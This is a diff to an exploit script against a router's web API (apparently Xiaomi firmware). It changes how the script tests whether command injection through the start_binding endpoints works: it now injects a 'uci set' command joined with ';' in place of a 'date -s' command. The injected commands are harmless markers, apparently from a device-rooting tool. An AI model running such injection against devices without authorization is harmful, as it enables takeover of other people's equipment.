@@ -54,26 +54,25 @@ def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
     return res
 
 
-# get device orig system time
-dst = gw.get_device_systime()
+# set default value for iperf_test_thr
+gw.set_diag_iperf_test_thr(20)
 
+vuln_test_num = 82000011
 exec_cmd = None
 exp_list = [ exploit_2, exploit_1 ]
 for exp_func in exp_list:
-    res = exp_func("date -s 203301020304")
+    res = exp_func(f"uci set diag.config.iperf_test_thr={vuln_test_num} ; uci commit diag")
     #if '"code":0' not in res:
     #    continue
-    time.sleep(1.2)
-    dxt = gw.get_device_systime()
-    if dxt['year'] == 2033 and dxt['month'] == 1 and dxt['day'] == 2:
-        if dxt['hour'] == 3 and dxt['min'] == 4:
-            exec_cmd = exp_func
-            break
-    time.sleep(1)
+    time.sleep(0.5)
+    iperf_test_thr = gw.get_diag_iperf_test_thr()
+    if iperf_test_thr == str(vuln_test_num):
+        exec_cmd = exp_func
+        break
+    time.sleep(0.5)
 
-# restore orig system time
-time.sleep(1)
-gw.set_device_systime(dst)
+# set default value for iperf_test_thr
+gw.set_diag_iperf_test_thr(20)
 
 if not exec_cmd:
     die('Exploits arn_switch/start_binding not working!!!')
